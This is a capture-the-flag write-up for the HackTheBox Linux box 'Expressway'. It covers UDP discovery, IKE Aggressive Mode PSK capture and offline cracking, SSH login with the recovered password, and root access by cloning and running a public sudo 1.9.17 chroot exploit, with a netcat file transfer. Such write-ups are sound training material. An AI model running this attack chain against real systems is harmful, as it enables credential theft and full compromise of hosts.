Expressway

HackTheBox Writeup

Box Name: Expressway

OS: Linux

IP Address: 10.129.55.71

TL;DR

Found only SSH initially, discovered additional UDP services (TFTP, DHCP, IKE). Used an IKE Aggressive-mode capture → psk-crack → recovered the PSK hash. Decrypted the PSK and got a password, SSHed into the machine using the recovered credentials, enumerated, and escalated to root via a sudo vulnerability (sudo 1.9.17) using a public PoC. Root flag recovered at /root/root.txt.

Reconnaissance

Initial TCP scan

nmap -sC -sV -O -p- 10.129.55.71

Notable output:

22/tcp open ssh OpenSSH 10.0p2 Debian 8

Only SSH initially visible.

UDP discovery

Further UDP scanning revealed several services:

  • UDP 69 — TFTP (open/filtered)
  • UDP 500 — ISAKMP / IKE (open)
  • UDP 4500 — NAT-T IKE (open/filtered)
  • UDP 68 — DHCP client port (filtered)
sudo nmap -sU 10.129.55.71

IKE / IPsec enumeration & PSK recovery

Fingerprint & aggressive mode capture

Used ike-scan to probe the gateway and check for Aggressive Mode support:

sudo ike-scan -A 10.129.55.71
Aggressive Mode Handshake returned ...
  ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) ... Hash(20 bytes)
  SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK ...)
  VID=09002689... (XAUTH)

This indicates Aggressive Mode is accepted and returns the values required to crack a PSK offline.

Produce PSK cracking params and crack offline

sudo ike-scan -A -Ppsk_params.txt --nat-t --dport=4500 10.129.55.71
psk-crack -d /usr/share/wordlists/rockyou.txt psk_params.txt
key "freakingrockstarontheroad" matches SHA1 hash ...

Recovered PSK: freakingrockstarontheroad

Internal access — SSH to host

The IKE Aggressive-mode handshake revealed an identity (ID_USER_FQDN) for the account ike@expressway. Using the recovered credentials, a direct SSH login was performed with the ike user and the recovered password:

ssh ike@10.129.55.71
whoami; id
cat /home/ike/user.txt
# => user flag captured

This direct SSH authentication with the ike account yielded the unprivileged shell and the user flag.

Local enumeration (prior to escalation)

sudo -V
sudo -l

Other methods such as enumerating folders and checking cron jobs yielded no results. Key findings:

Sudo version 1.9.17
Sudoers policy plugin version 1.9.17

/usr/local/bin/sudo
-rwsr-xr-x 1 root root ... /usr/local/bin/sudo

The installed sudo version 1.9.17 is known to be vulnerable (fixed in a subsequent patch release). This pointed to a public exploit for the 2025 CVE chain, notably CVE-2025-32462 / CVE-2025-32463 (--chroot related issues).

Privilege escalation — exploit sudo 1.9.17

Exploit used: https://github.com/KaiHT-Ladiant/CVE-2025-32463

Expressway was running sudo 1.9.17, vulnerable to the 2025 CVE chain. The public PoC from the KaiHT-Ladiant repository was used to exploit the --chroot related vulnerability and obtain a root shell. Always inspect the repo README before executing.

Commands used

cd /tmp
git clone https://github.com/KaiHT-Ladiant/CVE-2025-32463.git /tmp/CVE-2025-32463
cd /tmp/CVE-2025-32463
chmod +x exploit.sh 2>/dev/null || true
./exploit.sh
id
whoami
cat /root/root.txt

Note: I built the exploit on my own machine locally and transferred the file using NetCat.

nc -lvp 8080 > cve.sh          # Target machine
nc 10.129.55.71 8080 < cve.sh  # Host machine

Result

Running the KaiHT-Ladiant PoC spawned a root shell on the host. The root flag was read from /root/root.txt.
